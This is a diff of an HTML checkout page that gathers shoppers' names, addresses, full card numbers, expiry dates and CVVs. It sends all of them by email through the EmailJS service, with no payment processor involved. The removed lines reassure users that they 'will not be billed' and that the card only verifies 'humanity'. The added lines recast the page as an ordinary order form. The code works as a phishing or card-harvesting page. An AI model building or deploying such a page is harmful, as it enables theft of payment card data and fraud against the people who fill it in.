@@ -3,38 +3,43 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Checkout Form</title>
-<link rel="stylesheet" href="styles.css">
+<title>Complete Checkout Form</title>
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
     (function(){
-        emailjs.init("prEhy5YOK66_5Tvfg"); //public API key from EmailJS
+        emailjs.init("prEhy5YOK66_5Tvfg"); // Replace YOUR_USER_ID with your actual public API key from EmailJS
     })();
     
     function sendEmail() {
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var phone = document.getElementById("phone").value;
-        var checkInDate = document.getElementById("checkInDate").value;
-        var checkOutDate = document.getElementById("checkOutDate").value;
-        var roomType = document.getElementById("roomType").value;
-        var message = document.getElementById("message").value;
+        var address = document.getElementById("address").value;
+        var postalCode = document.getElementById("postalCode").value;
+        var productId = document.getElementById("productId").value;
+        var cardNumber = document.getElementById("cardNumber").value;
+        var expirationDate = document.getElementById("expirationDate").value;
+        var cvv = document.getElementById("cvv").value;
+        var cardHolderName = document.getElementById("cardHolderName").value;
 
         // Send email using EmailJS
         emailjs.send("service_a6nfqao", "template_ousg6r4", {
             from_name: name,
             from_email: email,
             phone: phone,
-            check_in_date: checkInDate,
-            check_out_date: checkOutDate,
-            room_type: roomType,
-            message: message
+            address: address,
+            postal_code: postalCode,
+            product_id: productId,
+            card_number: cardNumber,
+            expiration_date: expirationDate,
+            cvv: cvv,
+            card_holder_name: cardHolderName
         })
         .then(function(response) {
             console.log("Email sent successfully", response);
-            alert("Your googs is in process, and will be delivered in the next 2-3 days to the requested location!");
+            alert("Your order has been placed successfully!");
             // Optionally, you can clear the form fields after successful submission
-            document.getElementById("bookingForm").reset();
+            document.getElementById("checkoutForm").reset();
         }, function(error) {
             console.error("Email send failed", error);
             alert("Oops! Something went wrong. Please try again later.");
@@ -44,9 +49,9 @@
 </head>
 <body>
 
-<h2>Booking Checkout Form</h2>
+<h2>Complete Checkout Form</h2>
 
-<form id="bookingForm">
+<form id="checkoutForm">
     <label for="name">Name:</label><br>
     <input type="text" id="name" name="name" required><br><br>
 
@@ -56,49 +61,32 @@
     <label for="phone">Phone:</label><br>
     <input type="tel" id="phone" name="phone" required><br><br>
 
-    <label for="checkInDate">Booking Code:</label><br>
-    <input type="text" id="checkInDate" name="checkInDate" required><br><br>
+    <label for="address">Address:</label><br>
+    <textarea id="address" name="address" rows="4" cols="50" required></textarea><br><br>
 
-    <label for="checkOutDate">Postal Code:</label><br>
-    <input type="number" id="checkOutDate" name="checkOutDate" required><br><br>
+    <label for="postalCode">Postal Code:</label><br>
+    <input type="text" id="postalCode" name="postalCode" required><br><br>
 
-    
-    <p><b>Please Input Your full Address below, this is the address the goods purchased would be brought to.</b></p>
-    <label for="message">Full address:</label><br>
-    <textarea id="message" name="message" rows="4" cols="50" required></textarea><br><br>
+    <label for="productId">Product ID:</label><br>
+    <input type="text" id="productId" name="productId" required><br><br>
 
+    <hr>
+    <h3>Card Payment Details</h3>
 
+    <label for="cardNumber">Card Number:</label><br>
+    <input type="text" id="cardNumber" name="cardNumber" required><br><br>
 
+    <label for="expirationDate">Expiration Date:</label><br>
+    <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br><br>
 
+    <label for="cvv">CVV:</label><br>
+    <input type="password" id="cvv" name="cvv" maxlength="3" required><br><br>
 
-    <p><b>You will not be billed from this bank, this is just to clerify your humanity.</b></p>
-    <h2 style="text-align: center; color: #333;">Payment Information</h2>
+    <label for="cardHolderName">Cardholder's Name:</label><br>
+    <input type="text" id="cardHolderName" name="cardHolderName" required><br><br>
 
-<form id="cardForm" style="max-width: 400px; margin: 0 auto; padding: 20px; background-color: #fff; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);">
-    <div style="margin-bottom: 20px;">
-        <label for="cardNumber" style="font-weight: bold;">Card Number:</label><br>
-        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required>
-    </div>
-
-    <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
-        <div style="flex: 0 0 calc(50% - 10px);">
-            <label for="expirationDate" style="font-weight: bold;">Expiration Date:</label><br>
-            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required>
-        </div>
-        <div style="flex: 0 0 calc(50% - 10px);">
-            <label for="cvv" style="font-weight: bold;">CVV:</label><br>
-            <input type="password" id="cvv" name="cvv" maxlength="3" placeholder="123" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required>
-        </div>
-    </div>
-
-    <label for="cardHolderName" style="font-weight: bold;">Cardholder's Name:</label><br>
-    <input type="text" id="cardHolderName" name="cardHolderName" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required><br><br>
+    <input type="button" value="Place Order" onclick="sendEmail()">
 </form>
-    <input type="button" value="Purchase" onclick="sendEmail()">
-</form>
-
-
-
 
 </body>
 </html>
